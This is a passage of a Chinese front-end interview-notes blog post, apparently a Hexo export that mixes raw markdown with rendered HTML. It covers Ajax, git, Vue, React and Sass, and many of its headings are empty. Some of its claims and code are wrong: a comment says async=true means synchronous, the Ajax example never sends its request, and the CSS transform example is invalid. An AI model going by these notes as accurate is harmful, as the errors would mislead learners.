现代浏览器使用XMLHttpRequest对象；\n\n- 向服务器发送请求；\n\n```\nopen(method,url,async)\t\t//请求类型，url位置，true同步\nsend（string）\t\t\t//仅用于POST；\n```\n\n- 服务器响应；\n\n> 1.responseText   字符串形式的数据响应；\n>\n> 2.responseXML  XML形式的数据响应；\n\n- 判断是否成；\n\n> 1.onreadystatechange    存储函数，每当readystate属性改变时调用；\n>\n> 2.readyState  \t\t\t存有XMLHttpRequest的状态；0初始化，1连接建立，2请求已接受，3请求处理中，4请求已完成；\n>\n> 3.status\t\t\t200 ok   404 Page not found;\n\n```js\n//原生Ajax\nfunction oriAjax(url,){\n    //判断浏览器版本\n    if(window.XMLHttpRequest){\n        var ajaxRequest=new XMLHttpRequest();\n    }else{\n        var ajaxRequest=new ActiveXObject(\"Microsoft.XMLHTTP\");\n    }\n\n    ajaxRequest.open(\"GET\",url,true);\n\n    ajaxRequest.onreadystatechange=function(){\n        if(ajaxRequest.readyState==4 && ajaxRequest.status==200){\n            //更新dom结点\n            document.getElementById(\"myDiv\").innerHTML=ajaxRequest.responseText;\n        }else{\n            console.log(ajaxRequest.response);\n        }\n    }\n}\n```\n\n\n\n\n\n### 10.JS排序算法底层原理？\n\nsort（）数组长度小于22使用插入排序，大于22快排；\n\n\n\n### 11.nextTick\n\n# Git相关\n\nhttps://worktile.com/kb/ask/20275.html\n\n### 1.常见命令流程\n\n```shell\n#初始化仓库\ngit init  \n\n#切换到主分支\ngit checkout master\n\n#获取最新变更\ngit fetch origin\n\n#基于主分支创建dev分支\ngit checkout -b dev origin/master\n\n#添加到缓存\ngit add\n\n#提交到本地仓库\ngit commit -m \"备注\"\n\n#获取最新更新\ngit fetch origin\n```\n\n### 2.其他指令\n\n```shell\n#查看仓库状态\ngit status\n\n#将某个工作区的文件添加暂存区\ngit add filename   或 git add . 全部\n\n#查看工作区和暂存区差异\ngit diff 分支/id/\n\n#查看历史记录\ngit log\n\n#代码回滚\ngit reset HEAD^  \n\n#删除版本库文件\ngit rm filename\n\n#同步远程仓库\ngit push -u origin master\n\n#本地仓库推送到远程仓库\ngit remote add origin git@github.com:username/仓库名.git\n\n#克隆\ngit clone url\n\n#合并分支\ngit merge dev\n\n#删除分支\ngit branch -d dev\n\n\n\n```\n\n# NodeJS相关\n\n### 1.node流\n\n\n\n### 2.node如何写接口？\n\n\n\n### 3.express\n\n\n\n### 4.node常用模块\n\n# VUE相关\n\n### 1.Vue生命周期\n\n![组件生命周期图示](https://cn.vuejs.org/assets/lifecycle.16e4c08e.png)\n\n- beforeCreate:实例初始化完成，props解析之后，data()和computed等选项处理之前立即调用；此时不能获得DOM结点；\n- created：Vue实例已经创建，响应式数据、计算属性、方法和侦听器已经设置完成；但是由于没有挂载，依旧不能获得DOM结点；\n- beforeMount：组件内容被渲染拿到页面之前执行的函数，组件已经完成了其响应式状态的设置，但是还没有创建DOM结点；\n- mounted：组件渲染之后自动执行，一般异步请求写这里；这个阶段数据和DOM都已经完成渲染；\n- beforeUpdate：数据变化的时候执行的函数，此时变化后的数据还未渲染到页面上；\n- updated：数据变化以后执行，变化的数据已经渲染到页面上；\n- beforeUnmount：当Vue应用被销毁时，自动执行的函数；\n- unmounted：当vue应用销毁后，且DOM完全销毁之后自动执行；\n\n![img](https://upload-images.jianshu.io/upload_images/24919918-2b75253c04f7b643.png?imageMogr2/auto-orient/strip|imageView2/2/w/1200/format/webp)\n\n### 2.路由守卫\n\n\n\n### 3.组件通信有哪些？\n\nhttps://blog.csdn.net/longfan_/article/details/125324201\n\n> 一般分为如下关系：\n>\n> 父子间通信；\n>\n> 非父子间通信（兄弟，隔代）；\n\n- props / $emit\n\n> 父组件通过props的方式向子组件传递数据，而通过$emit子组件可以像父组件通信；\n>\n> props只可以从上一级组件传递到下一级组件，即所谓的单向数据流，而且props只读，不可被修改，所有修改都会失效并警告；\n>\n> 一、不应该在一个组组件内部改变prop，会破坏单向数据绑定；\n\n\n\n- \n\n\n\n### 4.v-if与show区别\n\n\n\n### 5.VUE与React区别\n\n\n\n### 6.Vue DIff算法\n\n\n\n### 7.Vue如何实现监听？\n\n\n\n\n\n\n\n# React相关\n\n### 1.类组件和函数组件\n\n- ##### 函数组件\n\n> 使用JS函数创建的组件；\n>\n> 首字母大写，React根据此区分组件和HTML元素；\n>\n> 函数必须有返回值,不渲染内容需要返回null；\n\n```jsx\n//普通函数\nfunction Header(){\n    return <div>头部组件</div>\n}\n//箭头函数\nconst Footer=()=>{\n    return <div>Rooter</div>\n}\n\n\n```\n\n- ##### 类组件\n\n> 使用class语法创建的组件；\n>\n> 首字母大写，必须继承React.Component父类；\n>\n> 必须有render函数，返回UI结构，可返回null;\n\n##### 状态组件：\n\n- 无状态组件不定义状态，没有组件生命周期，只负责渲染UI，Hooks出现后函数组件也可以有状态；性能较好；\n- 有状态组件可以定义自己的状态，拥有生命周期，能力更强；\n\n##### 类组件问题：\n\n- 处理this问题：绑定箭头函数、bind，声明箭头函数\n\n```js\nimport { Component } from \"react\";\n \nclass App extends Component {\n  // 状态\n  state = {\n    count: 0,\n  };\n  // 事件处理函数\n  handleClick(e) {\n    console.log(e)\n    console.log(this.state.count)\n  }\n  render() {\n    return (\n      <>\n        <div>计数器：{this.state.count}</div>\n        <div>\n+          <button onClick={(e)=>this.handleClick(e)}>按钮</button>\n        </div>\n      </>\n    );\n  }\n}\nexport default App;\n```\n\n```js\nimport { Component } from \"react\";\n \nclass App extends Component {\n  // 状态\n  state = {\n    count: 0,\n  };\n  // 事件处理函数\n  handleClick(e) {\n    console.log(e)\n    console.log(this.state.count)\n  }\n  render() {\n    return (\n      <>\n        <div>计数器：{this.state.count}</div>\n        <div>\n+          <button onClick={this.handleClick.bind(this)}>按钮</button>\n        </div>\n      </>\n    );\n  }\n}\nexport default App;\n```\n\n```js\nimport { Component } from \"react\";\n \nclass App extends Component {\n  // 状态\n  state = {\n    count: 0,\n  };\n  // 事件处理函数\n+  handleClick = (e) => {\n    console.log(e)\n    console.log(this.state.count)\n  }\n  render() {\n    return (\n      <>\n        <div>计数器：{this.state.count}</div>\n        <div>\n          <button onClick={this.handleClick}>按钮</button>\n        </div>\n      </>\n    );\n  }\n}\nexport default App;\n```\n\n- setState\n\n```js\n\n  handleClick = () => {\n    // 修改数据\n    this.setState({\n      // key是要修改的数据名称，value是对应的新值\n      count: this.state.count + 1,\n    });\n  };\n  updateList = () => {\n    // 修改列表\n    this.setState({\n      list: [...this.state.list, '相机'],\n    });\n  };\n  updateUser = () => {\n    // 修改对象\n    this.setState({\n      user: {\n        ...this.state.user,\n        name: 'tony',\n      },\n    });\n  };\n\n```\n\n##### 相同点\n\n- 都可以接受属性，返回React元素；\n\n##### 不同点\n\n- 编程思想不同，类组件需要创建实例，基于面向对象的编程方法，而函数式是基于函数式编程；\n- 内存占用不用：类组件需要创建并保存实例，会占用一定内存，函数组件不需要创建实例，可以节约内存占用；\n- 捕获特性：函数组件具有值捕获特性；\n- 状态：类组件有自己的实例，可以定义状态，而且可以修改状态更新组件，函数式组件以前没有状态，现在可以使用 useState 使用状态\n- 生命周期：类组件有自己完整的生命周期，可以在生命周期内编写逻辑，函数组件以前没有生命周期，现在可以使用 useEffect 实现类似生命周期的功能\n- 逻辑复用：类组件可以通过继承实现逻辑复用，但官方推荐组件优于继承，函数组件可以通过自定义 hooks 实现逻辑的复用\n- 跳过更新：类组件可以通过 `shouldComponentUpdate` 和 `PureComponent` 来跳过更新，而函数式组件可以使用 `React.memo` 来跳过更新\n- 发展前景：未来函数式组件将会成为主流，因为它可以更好的屏蔽 this 问题、规范和复用逻辑，更好的适合事件分片和并发渲染\n\n### 2.React Hook及其优化策略\n\n\n\n\n\n\n\n# Webpack相关\n\n### 1.Webpack配置\n\n\n\n### 2.loader执行顺序\n\n\n\n### 3.html webpack plugin的作用\n\n\n\n\n\n# 计算机网络相关\n\n### 1.CDN的理解\n\n\n\n### 2.跨域问题：什么是跨域？如何解决？\n\n\n\n### 3.节流与防抖\n\n\n\n### 4.TCP和UDP区别，三次握手，阻塞重传\n\n\n\n### 5.http和https\n\n\n\n\n\n# 操作系统\n\n### 1.线程、进程\n\n\n\n\n\n# 网络安全相关\n\n\n\n### 1.DDOS\n\n\n\n### 2.Web相关漏洞原理\n\n\n\n\n\n\n\n\n\n\n\n# 算法相关\n\n\n\n\n\n# Linux相关\n\n### 1.linux常用命令\n\n\n\n# 项目相关\n\n### 1.项目上线如何捕获异常？\n\n\n\n\n\n### 2.项目加载头花","slug":"前端面经","published":1,"updated":"2023-05-25T12:53:43.059Z","_id":"clg29vyia006wao9c1yah4j4h","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"前端三大件\"><a href=\"#前端三大件\" class=\"headerlink\" title=\"前端三大件\"></a>前端三大件</h1><h2 id=\"一、HTML\"><a href=\"#一、HTML\" class=\"headerlink\" title=\"一、HTML\"></a>一、HTML</h2><h2 id=\"二、CSS\"><a href=\"#二、CSS\" class=\"headerlink\" title=\"二、CSS\"></a>二、CSS</h2><h3 id=\"1-Flex布局\"><a href=\"#1-Flex布局\" class=\"headerlink\" title=\"1.Flex布局\"></a>1.Flex布局</h3><blockquote>\n<p>Flex布局包括容器和Item两部分；一个容器的所有子元素都成为他的item成员；</p>\n</blockquote>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/03/16/1d4271c9004b7a95.png\"></p>\n<ul>\n<li>flex-direction:主轴方向，row，row-reverse，column，column-recerse；</li>\n<li>flex-wrap:默认所有的容器里的Item都在一条线上，一行放不下可以换行：nowrap（默认不换行）wrap（换行，第一行在上）</li>\n<li>flex-flow:前两者的缩写，默认row nowrap</li>\n<li>justify-content:主轴对其方式，有五个值，flex-start:主轴起始位置对齐；flex-end:主轴结束位置对齐；center:居中；space-between:始末位置各一个，中间按照平均间距防止；space-around:每个item周围的间隔相同；</li>\n<li>align-items:纵轴如何对齐，五个值：flex-start:从最上方开始，排列row；flex-end:最底下开始；center:中间线；baseline:项目的第一行文字的基线对其；stretch:默认，item妹有设置高度或者auto，占满容器；</li>\n<li>align-content:定义多根轴线对齐方式，一行则不生效；</li>\n<li>order属性：属于item，按照order大小排序；</li>\n<li>flex-grow:定义item的放大比例；</li>\n<li>flex-shrink:按照比例缩小；</li>\n<li>flex: flex-grow,flex-shrink,flex-basis;</li>\n<li>align-self:允许item自己的属性；可覆盖aligin-items;</li>\n</ul>\n<h3 id=\"2-CSS预处理器\"><a href=\"#2-CSS预处理器\" class=\"headerlink\" title=\"2.CSS预处理器\"></a>2.CSS预处理器</h3><blockquote>\n<p>CSS预处理器式一种基于CSS，用于解决CSS难以解决的问题的Domian Specific Language;</p>\n<p>通过用一种专门的编程语言，为CSS添加一些编程特性，再编译成CSS文件；</p>\n<p>如：语法不够强大，妹有变量和合理的样式复用机制等；</p>\n</blockquote>\n<h5 id=\"CSS预处理器的作用\"><a href=\"#CSS预处理器的作用\" class=\"headerlink\" title=\"CSS预处理器的作用\"></a>CSS预处理器的作用</h5><ul>\n<li>提供css缺失的样式层复用机制，减少冗余代码；</li>\n<li>提高样式代码的可维护性；</li>\n</ul>\n<h5 id=\"Sass（-scss）\"><a href=\"#Sass（-scss）\" class=\"headerlink\" title=\"Sass（.scss）\"></a>Sass（.scss）</h5><p>成熟稳定强大的专业级CSS拓展语言，兼容CSS、功能丰富；</p>\n<p>功能：</p>\n<ul>\n<li>变量、常量</li>\n</ul>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scss\"><span class=\"hljs-variable\">$bgColor</span>:<span class=\"hljs-number\">#fff</span>;\t\t<span class=\"hljs-comment\">//以$开头，表示全局和局部变量</span><br><span class=\"hljs-selector-tag\">div</span>&#123;<br>    <span class=\"hljs-variable\">$width</span>:<span class=\"hljs-number\">100px</span>;\t<span class=\"hljs-comment\">//局部变量</span><br>    <span class=\"hljs-attribute\">width</span>:<span class=\"hljs-variable\">$width</span>;<br>    <span class=\"hljs-attribute\">background</span>:<span class=\"hljs-variable\">$bgColor</span>;<br>&#125;<br><br><span class=\"hljs-comment\">//变量用在属性中，需要写在#&#123;&#125;中</span><br><span class=\"hljs-variable\">$posi</span><span class=\"hljs-selector-pseudo\">:left</span>;<br><span class=\"hljs-selector-tag\">div</span>&#123;<br>    <span class=\"hljs-attribute\">border</span>-#&#123;<span class=\"hljs-variable\">$posi</span>&#125;:<span class=\"hljs-number\">1</span> px solid <span class=\"hljs-variable\">$color</span>;<br>&#125;<br><br><span class=\"hljs-comment\">//默认变量，值后面加上 ！default</span><br><span class=\"hljs-variable\">$myLineHeight</span>:<span class=\"hljs-number\">1.5</span> !default;<br><br><span class=\"hljs-selector-tag\">body</span>&#123;<br>    <span class=\"hljs-attribute\">line-height</span>:<span class=\"hljs-variable\">$myLineHeight</span>;<br>&#125;<br><br><span class=\"hljs-selector-tag\">body</span>&#123;<br>    <span class=\"hljs-attribute\">line-height</span>:<span class=\"hljs-number\">1.5</span>;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>CSS代码嵌套</li>\n</ul>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scss\"><span class=\"hljs-comment\">//在一个选择器中嵌套另一个选择器来实现继承，增强了sass文件的结构性和可读性；</span><br><span class=\"hljs-comment\">//选择器嵌套中，可以使用&amp;表示父元素选择器；</span><br><span class=\"hljs-selector-id\">#top_btn</span>&#123;<br>    <span class=\"hljs-attribute\">line-height</span>:<span class=\"hljs-number\">40px</span>;<br>    <span class=\"hljs-attribute\">text-transform</span>:capitalize;<br>    <span class=\"hljs-selector-tag\">li</span>&#123;<br>        <span class=\"hljs-attribute\">float</span><span class=\"hljs-selector-pseudo\">:left</span>;<br>    &#125;<br>    <span class=\"hljs-selector-tag\">a</span>&#123;<br>        <span class=\"hljs-attribute\">display</span>：block;<br>        <br>        &amp;<span class=\"hljs-selector-pseudo\">:hover</span>&#123;<br>            <span class=\"hljs-attribute\">color</span>:<span class=\"hljs-number\">#ddd</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class=\"hljs-comment\">//属性嵌套</span><br><span class=\"hljs-selector-class\">.main-container</span>&#123;<br>    <span class=\"hljs-comment\">//选择器嵌套</span><br>    &amp;-<span class=\"hljs-attribute\">top</span>&#123;<br>        <span class=\"hljs-attribute\">color</span>:red;<br>    &#125;<br>    <span class=\"hljs-comment\">//伪类嵌套</span><br>    &amp;<span class=\"hljs-selector-pseudo\">:hover</span>&#123;<br>        <span class=\"hljs-attribute\">color</span>:green<span class=\"hljs-string\">&#x27;</span><br><span class=\"hljs-string\">    &#125;</span><br><span class=\"hljs-string\">&#125;</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>混入Mixin</li>\n</ul>\n<blockquote>\n<p>Mixins是CSS预处理器最强大的特性；</p>\n<p>可以将一部分样式抽出，作为单独定义的模块，被很多选择器重复使用；</p>\n</blockquote>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scss\"><span class=\"hljs-comment\">//无参数mixin</span><br><span class=\"hljs-keyword\">@mixin</span> center-block&#123;<br>    <span class=\"hljs-attribute\">margin-left</span>:auto;<br>    <span class=\"hljs-attribute\">margin-right</span>:auto;<br>&#125;<br><span class=\"hljs-selector-class\">.btn</span>&#123;<br>    <span class=\"hljs-keyword\">@include</span> center-block;<br>&#125;<br><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scss\"><span class=\"hljs-comment\">//有参数mixin</span><br><span class=\"hljs-keyword\">@mixin</span> theme(<span class=\"hljs-variable\">$theme</span>:Darkgray)&#123;<br>    <span class=\"hljs-attribute\">background</span>:<span class=\"hljs-variable\">$theme</span>;<br>    <span class=\"hljs-attribute\">box-shadow</span>:<span class=\"hljs-number\">0</span> <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">1px</span> <span class=\"hljs-built_in\">rgba</span>(<span class=\"hljs-variable\">$theme</span>, .<span class=\"hljs-number\">25</span>);<br>    <span class=\"hljs-attribute\">color</span>:<span class=\"hljs-number\">#fff</span>;<br>&#125;<br><br><span class=\"hljs-selector-class\">.infor</span>&#123;<br>    <span class=\"hljs-keyword\">@include</span> theme;<br>&#125;<br><br><span class=\"hljs-selector-class\">.alert</span>&#123;<br>    <span class=\"hljs-keyword\">@include</span> theme(<span class=\"hljs-variable\">$theme</span>:Darkred);<br>&#125;<br><br><span class=\"hljs-comment\">//多个mixin,多个参数以逗号分隔，如果@include传入的参数个数小于@mixin定义参数的个数，则按照顺序表示，后面不足的使用默认值；如果不足的没有默认值则报错；</span><br><span class=\"hljs-keyword\">@mixin</span> theme(<span class=\"hljs-variable\">$theme</span>:Darkgray,<span class=\"hljs-variable\">$color</span>:red)&#123;<br>    <span class=\"hljs-attribute\">background</span>:<span class=\"hljs-variable\">$theme</span>;<br>    <span class=\"hljs-attribute\">box-shadow</span>:<span class=\"hljs-number\">0</span> <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">1px</span> <span class=\"hljs-built_in\">rgba</span>(<span class=\"hljs-variable\">$theme</span>, .<span class=\"hljs-number\">25</span>);<br>    <span class=\"hljs-attribute\">color</span>:<span class=\"hljs-variable\">$red</span>;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scss\"><span class=\"hljs-comment\">//模块系统</span><br><span class=\"hljs-comment\">//test.scss</span><br><span class=\"hljs-variable\">$font-stack</span>: Helvetica, sans-serif;<br><span class=\"hljs-variable\">$primary-color</span>: <span class=\"hljs-number\">#333</span>;<br><br><span class=\"hljs-selector-tag\">body</span> &#123;<br>  <span class=\"hljs-attribute\">font</span>: <span class=\"hljs-number\">100%</span> <span class=\"hljs-variable\">$font-stack</span>;<br>  <span class=\"hljs-attribute\">color</span>: <span class=\"hljs-variable\">$primary-color</span>;<br>&#125;<br><br><span class=\"hljs-comment\">//styles.scss</span><br><span class=\"hljs-comment\">// 使用@use导入文件</span><br><span class=\"hljs-keyword\">@use</span> <span class=\"hljs-string\">&#x27;test&#x27;</span>; <span class=\"hljs-comment\">// 生成了一个 test 命名空间</span><br><br><span class=\"hljs-selector-class\">.inverse</span> &#123;<br>  <span class=\"hljs-attribute\">background-color</span>: test.<span class=\"hljs-variable\">$primary-color</span>;<br>  <span class=\"hljs-attribute\">color</span>: white;<br>&#125;<br><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>继承</li>\n</ul>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scss\"><span class=\"hljs-comment\">/* This CSS will print because %message-shared is extended. */</span><br>%message-shared &#123;<br>  <span class=\"hljs-attribute\">border</span>: <span class=\"hljs-number\">1px</span> solid <span class=\"hljs-number\">#ccc</span>;<br>  <span class=\"hljs-attribute\">padding</span>: <span class=\"hljs-number\">10px</span>;<br>  <span class=\"hljs-attribute\">color</span>: <span class=\"hljs-number\">#333</span>;<br>&#125;<br><br><span class=\"hljs-comment\">// This CSS won&#x27;t print because %equal-heights is never extended.</span><br>%equal-heights &#123;<br>  <span class=\"hljs-attribute\">display</span>: flex;<br>  <span class=\"hljs-attribute\">flex-wrap</span>: wrap;<br>&#125;<br><br><span class=\"hljs-selector-class\">.message</span> &#123;<br>  <span class=\"hljs-keyword\">@extend</span> %message-shared;<br>&#125;<br><br><span class=\"hljs-selector-class\">.success</span> &#123;<br>  <span class=\"hljs-keyword\">@extend</span> %message-shared;<br>  <span class=\"hljs-attribute\">border-color</span>: green;<br>&#125;<br><br><span class=\"hljs-selector-class\">.error</span> &#123;<br>  <span class=\"hljs-keyword\">@extend</span> %message-shared;<br>  <span class=\"hljs-attribute\">border-color</span>: red;<br>&#125;<br><br><span class=\"hljs-selector-class\">.warning</span> &#123;<br>  <span class=\"hljs-keyword\">@extend</span> %message-shared;<br>  <span class=\"hljs-attribute\">border-color</span>: yellow;<br>&#125;<br><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>函数</li>\n</ul>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scss\">x <span class=\"hljs-keyword\">@use</span> <span class=\"hljs-string\">&quot;sass:math&quot;</span>;<br><br><span class=\"hljs-selector-class\">.container</span>&#123;<br>    <span class=\"hljs-attribute\">display</span>:flex;<br>&#125;<br><br><span class=\"hljs-selector-tag\">article</span><span class=\"hljs-selector-attr\">[role=<span class=\"hljs-string\">&quot;main&quot;</span>]</span>&#123;<br>    <span class=\"hljs-attribute\">width</span>:math.<span class=\"hljs-built_in\">div</span>(<span class=\"hljs-number\">600px</span>,<span class=\"hljs-number\">960px</span>)*<span class=\"hljs-number\">100%</span>;<br>&#125;<br><br><span class=\"hljs-selector-tag\">aside</span><span class=\"hljs-selector-attr\">[role=<span class=\"hljs-string\">&quot;complementary&quot;</span>]</span>&#123;<br>    <span class=\"hljs-attribute\">width</span>:math.<span class=\"hljs-built_in\">div</span>(<span class=\"hljs-number\">300px</span>,<span class=\"hljs-number\">960px</span>)*<span class=\"hljs-number\">100%</span>;<br>    <span class=\"hljs-attribute\">margin-left</span>:auto;<br>&#125;<br><span class=\"hljs-comment\">//支持加减乘除，循环等；</span><br></code></pre></td></tr></table></figure>\n\n<p>缺点：采用Ruby语言编写，单独使用妹有问题，但是工程化项目中，存在问题；</p>\n<ul>\n<li>需要借助node-sass,node版本与node-sass版本相关联，一旦本地nodeJS升级，出现node-sass无法工作；（Rebuild或者冲洗安装node-sass）</li>\n<li>需要node-gyp作为先决条件-&gt;需要兼容版本的python；</li>\n<li>binding.node源无法访问或者速度慢；</li>\n</ul>\n<h5 id=\"Less\"><a href=\"#Less\" class=\"headerlink\" title=\"Less\"></a>Less</h5><p>Less是CSS预处理语言，拓展了CSS，增加了变量、Mixin、函数等特性；使CSS更易维护和拓展。Less可以运行在Node或浏览器端；</p>\n<h5 id=\"Stylus\"><a href=\"#Stylus\" class=\"headerlink\" title=\"Stylus\"></a>Stylus</h5><p>Stylus是一种创新的样式表语言，可编译为CSS。Stylus是用nodeJS构建的；</p>\n<h3 id=\"3-多屏适应，自适应布局和响应式布局区别\"><a href=\"#3-多屏适应，自适应布局和响应式布局区别\" class=\"headerlink\" title=\"3.多屏适应，自适应布局和响应式布局区别\"></a>3.多屏适应，自适应布局和响应式布局区别</h3><h3 id=\"4-过渡动画\"><a href=\"#4-过渡动画\" class=\"headerlink\" title=\"4.过渡动画\"></a>4.过渡动画</h3><ul>\n<li>transform（平移旋转缩放）</li>\n</ul>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\">.&#123;<br>    translate(<span class=\"hljs-number\">50px</span>,<span class=\"hljs-number\">100px</span>);\t\t\t<span class=\"hljs-comment\">/*平移，x y方向*/</span><br>    rotate(<span class=\"hljs-number\">20deg</span>);\t\t\t\t\t<span class=\"hljs-comment\">/*旋转 顺时针旋转20°*/</span><br>    rotateX(<span class=\"hljs-number\">150deg</span>);\t\t\t\t\t<span class=\"hljs-comment\">/*x轴旋转*/</span><br>    scaleX(<span class=\"hljs-number\">2</span>);\t\t\t<span class=\"hljs-comment\">/*增大两倍宽度*/</span><br>    scale(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>);\t\t\t\t<span class=\"hljs-comment\">/*宽度一赔，高度两倍*/</span><br>    <br>&#125;<br></code></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li>animation</li>\n</ul>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\">*<span class=\"hljs-attribute\">animation-name</span>：关键帧的名字，该参数必需。<br>*<span class=\"hljs-attribute\">animation-duration</span>：动画持续的时间，该参数必需。<br><span class=\"hljs-attribute\">animation-timing-function</span>：定时器函数，默认是ease。<br><span class=\"hljs-attribute\">animation-delay</span>：动画效果多少秒后开始，默认为<span class=\"hljs-number\">0</span>。<br><span class=\"hljs-attribute\">animation-iteration-count</span>：动画重复的次数，可以指定为一个整数，表示多少次，默认值是infinite关键字，表示无限次。<br><span class=\"hljs-attribute\">animation-direction</span>：动画方向，可能的值为forward、backward或alternating，默认值为<span class=\"hljs-attribute\">normal</span>。<br><span class=\"hljs-attribute\">animation-fill-mode</span>：默认值为<span class=\"hljs-attribute\">none</span>。<br><span class=\"hljs-attribute\">animation-play-state</span>：动画默认是否生效，默认值为running。<br><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><code>animation</code> 强调流程与控制，对元素的一个或多个属性的变化进行控制，可以有多个<a href=\"https://so.csdn.net/so/search?q=%E5%85%B3%E9%94%AE%E5%B8%A7&spm=1001.2101.3001.7020\">关键帧</a>（<code>animation</code> 和 <code>@keyframes</code>结合使用）</li>\n<li><code>transition</code> 